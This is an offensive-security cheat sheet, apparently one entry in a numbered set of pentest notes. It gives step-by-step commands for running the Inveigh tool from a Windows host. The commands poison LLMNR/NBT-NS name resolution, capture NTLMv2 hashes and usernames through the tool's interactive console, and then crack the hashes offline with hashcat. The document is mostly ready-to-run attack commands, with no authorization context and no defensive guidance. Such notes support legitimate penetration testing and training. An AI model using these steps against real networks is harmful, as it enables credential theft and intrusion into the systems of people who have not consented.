# 01.15 LLMNR NBT-NS Poisoning from Windows Inveigh

> Run `Inveigh` from a Windows attack host for LLMNR/NBT-NS poisoning when Responder isn't an option.

## Overview

When constrained to a Windows attack host, Inveigh (PowerShell or C#) performs the same LLMNR/NBT-NS poisoning as Responder. The interactive C# console lets you retrieve captured unique hashes and usernames live.

## Steps

- Import the PowerShell module and review parameters before running.
- Start PowerShell Inveigh with NBNS enabled and file output.
- Alternatively, drop to the C# binary `Inveigh.exe` which has fewer dependencies.
- Enter the interactive console: press `ESC` then type commands.
- Retrieve unique NTLMv2 hashes with `GET NTLMV2UNIQUE`.
- List all captured usernames with `GET NTLMV2USERNAMES`.
- Crack captured hashes offline with hashcat -m 5600.

## Commands

### Import module

```powershell
Import-Module .\Inveigh.ps1
```

### Review parameters

```powershell
(Get-Command Invoke-Inveigh).Parameters
```

### Start Inveigh PowerShell

```powershell
Invoke-Inveigh Y -NBNS Y -ConsoleOutput Y -FileOutput Y
```

### Start Inveigh C#

```cmd
.\Inveigh.exe
```

### Get unique hashes (console)

```text
GET NTLMV2UNIQUE
```

### Get usernames (console)

```text
GET NTLMV2USERNAMES
```
